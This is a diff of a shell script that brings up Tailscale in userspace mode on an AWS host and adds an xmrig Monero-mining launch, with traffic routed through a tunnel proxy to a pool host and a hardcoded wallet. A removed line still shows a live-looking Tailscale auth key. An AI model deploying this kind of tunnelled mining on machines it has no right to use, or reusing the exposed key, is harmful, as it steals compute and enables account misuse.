@@ -1,4 +1,3 @@
-
 TS_KEY=""
 DOCKER_PROXY_IP="aws-proxy-box" 
 WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"
@@ -15,7 +14,15 @@ echo "Starting Tailscale in Userspace Mode..."
 sleep 5
 
 echo "Connecting to New Tailnet..."
-./tailscale --socket=ts.sock up --authkey='tskey-auth-krr1zi8Ndc11CNTRL-j1o9tRQKxydZfgXZ62x2ydxncLSYuonXM' --hostname="aws-arm-3" --accept-dns=false
+./tailscale --socket=ts.sock up --authkey="" --hostname="aws-arm-3" --accept-dns=false
 sleep 5
 
 echo "Launching with your existing miner logic..."
+
+./xmrig-aarch64-static \
+  -c config.json \
+  -o "$DOCKER_PROXY_IP:9999" \
+  -u "$WALLET" \
+  --proxy "127.0.0.1:1055" \
+  --no-tls \
+  --rig-id "aws-$(hostname)"
